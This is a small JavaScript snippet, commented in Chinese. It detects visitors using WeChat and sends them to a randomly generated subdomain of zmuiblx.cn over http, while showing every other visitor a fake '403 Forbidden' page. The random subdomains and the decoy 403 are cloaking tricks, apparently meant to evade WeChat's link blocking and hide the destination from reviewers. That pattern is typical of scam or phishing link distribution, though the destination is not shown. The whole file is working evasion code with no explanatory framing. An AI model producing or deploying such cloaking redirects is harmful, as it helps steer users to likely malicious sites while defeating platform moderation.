// 判断是否在微信中访问
function isWeChat() {
  var ua = navigator.userAgent.toLowerCase();
  return ua.indexOf('micromessenger') !== -1;
}

// 生成随机字符串
function generateRandomString(length) {
  var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  var result = '';
  for (var i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return result;
}

// 执行重定向操作
function redirectToDomain() {
  var randomString = generateRandomString(10);
  var domain = 'zmuiblx.cn';
  var redirectURL = 'http://' + randomString + '.' + domain;
  window.location.href = redirectURL;
}

if (isWeChat()) {
  // 显示"请稍等"信息
  document.write('<h1>请稍等...</h1>');
  redirectToDomain();
} else {
  // 非微信访问，显示403页面
  document.write('<h1>403 Forbidden</h1>');
}
